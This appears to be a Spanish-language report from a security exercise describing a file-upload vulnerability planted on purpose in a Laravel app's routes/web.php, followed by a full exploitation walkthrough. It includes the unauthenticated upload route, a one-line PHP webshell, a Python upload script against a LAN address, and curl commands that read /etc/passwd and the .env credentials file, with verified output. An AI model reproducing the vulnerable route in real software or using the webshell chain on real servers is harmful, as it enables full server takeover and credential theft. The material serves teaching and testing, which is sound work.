# 04 - File Upload / RCE

**Responsable:** Alex
**Tipo:** File Upload + Remote Code Execution (A03:2021 - Injection)

## Archivo modificado
`routes/web.php` (líneas 93-103)

## Cambio realizado
Se agregó una ruta POST `/upload` **sin autenticación** y **sin validación de tipo de archivo**:

```php
// 🔥 VULNERABLE - Sin auth, sin validación:
Route::post('/upload', function (Illuminate\Http\Request $request) {
    $request->validate(['file' => ['required', 'file']]);
    $file = $request->file('file');
    $name = $file->getClientOriginalName();
    $uploadPath = public_path('uploads');
    if (!file_exists($uploadPath)) {
        mkdir($uploadPath, 0755, true);
    }
    $file->move($uploadPath, $name);
    return response()->json(['success' => true, 'path' => '/uploads/' . $name]);
});
```

## Explotación

### Paso 1: Crear webshell
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Paso 2: Subir webshell (sin autenticación)
```python
import requests, io, re

s = requests.Session()
BASE = "http://192.168.18.38:8001"

# Obtener CSRF token (única protección)
r = s.get(f"{BASE}/login")
token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)

# Subir archivo malicioso
files = {'file': ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php')}
r = s.post(f"{BASE}/upload", data={"_token": token}, files=files)
print(r.json())  # → {"success":true,"path":"/uploads/shell.php"}
```

### Paso 3: Ejecutar comandos
```bash
# Información del sistema
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=id"
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=whoami"
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=uname+-a"

# Exploración
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=ls+-la+/"
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=cat+/etc/passwd"
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=cat+/etc/os-release"

# Código fuente del proyecto
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=cat+.env"
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=ls+-la+/var/www/html"
```

## Resultado (verificado)
```
UPLAOD: HTTP 200 → {"success":true,"path":"/uploads/shell.php"}
$ id     → uid=82(www-data) gid=82(www-data)
$ whoami → www-data
$ cat /etc/os-release → NAME="Alpine Linux" VERSION_ID=3.24.1
```

## Impacto
- **Compromiso total del servidor web**
- Acceso a variables de entorno (`.env` contiene credenciales de BD)
- Potencial pivoting hacia la base de datos PostgreSQL
- Posible reverse shell para acceso persistente
